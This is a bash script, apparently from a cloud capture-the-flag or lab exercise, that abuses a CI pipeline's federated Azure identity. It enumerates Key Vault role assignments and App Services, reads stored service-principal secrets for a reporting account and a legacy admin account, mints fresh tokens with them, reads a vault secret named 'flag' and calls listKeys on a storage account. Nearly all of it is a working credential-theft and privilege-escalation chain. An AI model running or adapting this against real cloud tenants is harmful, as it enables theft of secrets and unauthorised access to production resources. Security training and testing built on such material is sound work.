#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
echo "cicd-deployer ARM token len=${#ARM}"

echo ""
echo "=== ALL ROLE ASSIGNMENTS ON kv-tbl-sec-x3euoz ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERROR:", err.get("code",""), err.get("message","")[:300])
else:
    vals=d.get("value",[])
    print("Total role assignments on KV sec:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  principalId={pid} roleId={role}")
' 2>/dev/null

echo ""
echo "=== ALL ROLE ASSIGNMENTS ON kv-tbl-prod-x3euoz ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERROR:", err.get("code",""), err.get("message","")[:300])
else:
    vals=d.get("value",[])
    print("Total role assignments on KV prod:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  principalId={pid} roleId={role}")
' 2>/dev/null

echo ""
echo "=== ALL APP SERVICES IN PLATFORM RG ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERROR:", err.get("code",""), err.get("message","")[:200])
else:
    for s in d.get("value",[]):
        name=s.get("name","")
        kind=s.get("kind","")
        id=s.get("identity",{}) or {}
        sami=id.get("principalId","")
        uamis=list((id.get("userAssignedIdentities",{}) or {}).keys())
        print(f"  name={name} kind={kind} sami={sami[:8] if sami else None} uamis={uamis}")
' 2>/dev/null

echo ""
echo "=== ALL APP SERVICES IN REPORTING RG ==="
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for s in d.get("value",[]):
    name=s.get("name","")
    kind=s.get("kind","")
    id=s.get("identity",{}) or {}
    sami=id.get("principalId","")
    uamis=list((id.get("userAssignedIdentities",{}) or {}).keys())
    print(f"  name={name} kind={kind} sami={sami[:8] if sami else None} uamis={uamis}")
' 2>/dev/null

echo ""
echo "=== ALL SECRETS IN KV PROD ==="
az keyvault secret list --vault-name kv-tbl-prod-x3euoz 2>/dev/null | python3 -c '
import sys,json
secrets=json.load(sys.stdin)
for s in secrets:
    print(f"  name={s[\"id\"].rsplit(\"/\",1)[-1]} enabled={s.get(\"attributes\",{}).get(\"enabled\",\"\")}")
' 2>/dev/null

echo ""
echo "=== READ LEGACY-ADMIN-PRINCIPAL ==="
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name legacy-admin-principal 2>/dev/null \
  | python3 -c '
import sys,json
d=json.load(sys.stdin)
v=json.loads(d.get("value","{}"))
print("appId:", v.get("appId",""))
print("clientSecret:", v.get("clientSecret","")[:20]+"...")
' 2>/dev/null

echo ""
echo "=== TEST LEGACY-ADMIN ACCESS TO KV SEC ==="
LA_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name legacy-admin-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
LA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name legacy-admin-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)

# Get vault token for legacy-admin
LA_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$LA_CID" --data-urlencode "client_secret=$LA_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "legacy-admin vault token len=${#LA_VT}"

if [ "${#LA_VT}" -gt 100 ]; then
  echo "--- KV sec secrets list ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $LA_VT"
  echo ""
  echo "--- KV sec flag secret ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
    -H "Authorization: Bearer $LA_VT"
fi

# Get ARM token for legacy-admin
LA_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$LA_CID" --data-urlencode "client_secret=$LA_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "legacy-admin ARM token len=${#LA_AT}"

if [ "${#LA_AT}" -gt 100 ]; then
  echo "--- legacy-admin listKeys on appcfg storage ---"
  curl -sS -X POST \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" \
    -H "Authorization: Bearer $LA_AT" -H "Content-Type: application/json" -d '{}'
  echo ""

  echo "--- legacy-admin role assignments on sub ---"
  LA_OID=$(python3 -c "
import sys,json,base64
t='$LA_AT'.split('.')[1]; t+='='*((-len(t))%4)
d=json.loads(base64.urlsafe_b64decode(t))
print(d.get('oid',''))
" 2>/dev/null)
  echo "legacy-admin OID: $LA_OID"
  curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$LA_OID'" \
    -H "Authorization: Bearer $LA_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
print("Assignments:", len(vals))
for r in vals:
    role=r["properties"]["roleDefinitionId"].split("/")[-1]
    scope=r["properties"]["scope"]
    print(f"  role={role} scope={scope[:80]}")
' 2>/dev/null
fi

echo "DONE"
